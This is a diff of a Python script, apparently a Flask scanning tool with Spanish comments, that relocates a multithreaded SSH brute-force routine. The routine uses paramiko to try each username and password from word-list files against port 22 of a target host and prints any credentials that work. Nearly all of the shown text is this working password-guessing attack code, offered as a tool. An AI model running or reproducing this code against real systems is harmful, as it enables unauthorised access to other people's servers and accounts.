@@ -108,6 +108,58 @@ def scan(target):
 
 if __name__ == '__main__':
     app.run(debug=True)
+    
+    
+# se empieza fuerza bruta    
+stop_flag = False
+max_threads = 5  # Número máximo de hilos simultáneos
+thread_limiter = threading.BoundedSemaphore(max_threads)
+
+def ssh_connect(username, password):
+    global stop_flag
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+        stop_flag = True
+        print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username), 'green'))
+    except paramiko.ssh_exception.AuthenticationException:
+        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username), 'red'))
+    except paramiko.ssh_exception.SSHException as e:
+        print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
+    except Exception as e:
+        print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
+    finally:
+        ssh.close()
+        thread_limiter.release()
+
+host = targets
+usernames_file = "usernamesReal.txt"
+passwords_file = "passwordsReal.txt"
+print('\n')
+
+if os.path.exists(passwords_file) == False:
+    print('[!!] That File/Path Doesnt Exist')
+    sys.exit(1)
+
+print('Empezando fuerza bruta en host ' + host ) 
+
+with open(usernames_file, 'r') as users:
+    for username in users:
+        username = username.strip()
+        with open(passwords_file, 'r') as passwords:
+            for password in passwords:
+                password = password.strip()
+                if stop_flag:
+                    break
+                thread_limiter.acquire()
+                t = threading.Thread(target=ssh_connect, args=(username, password))
+                t.start()
+                time.sleep(0.5)
+                if stop_flag:
+                    break
+        if stop_flag:
+            break
 
 # funciona bien de hoy
 """
@@ -216,55 +268,4 @@ if ',' in targets:
 else:
     scan(targets)
 """
-    
-# se empieza fuerza bruta    
-stop_flag = False
-max_threads = 5  # Número máximo de hilos simultáneos
-thread_limiter = threading.BoundedSemaphore(max_threads)
-
-def ssh_connect(username, password):
-    global stop_flag
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(host, port=22, username=username, password=password)
-        stop_flag = True
-        print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username), 'green'))
-    except paramiko.ssh_exception.AuthenticationException:
-        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username), 'red'))
-    except paramiko.ssh_exception.SSHException as e:
-        print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
-    except Exception as e:
-        print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
-    finally:
-        ssh.close()
-        thread_limiter.release()
-
-host = targets
-usernames_file = "usernamesReal.txt"
-passwords_file = "passwordsReal.txt"
-print('\n')
-
-if os.path.exists(passwords_file) == False:
-    print('[!!] That File/Path Doesnt Exist')
-    sys.exit(1)
-
-print('Empezando fuerza bruta en host ' + host ) 
-
-with open(usernames_file, 'r') as users:
-    for username in users:
-        username = username.strip()
-        with open(passwords_file, 'r') as passwords:
-            for password in passwords:
-                password = password.strip()
-                if stop_flag:
-                    break
-                thread_limiter.acquire()
-                t = threading.Thread(target=ssh_connect, args=(username, password))
-                t.start()
-                time.sleep(0.5)
-                if stop_flag:
-                    break
-        if stop_flag:
-            break
 
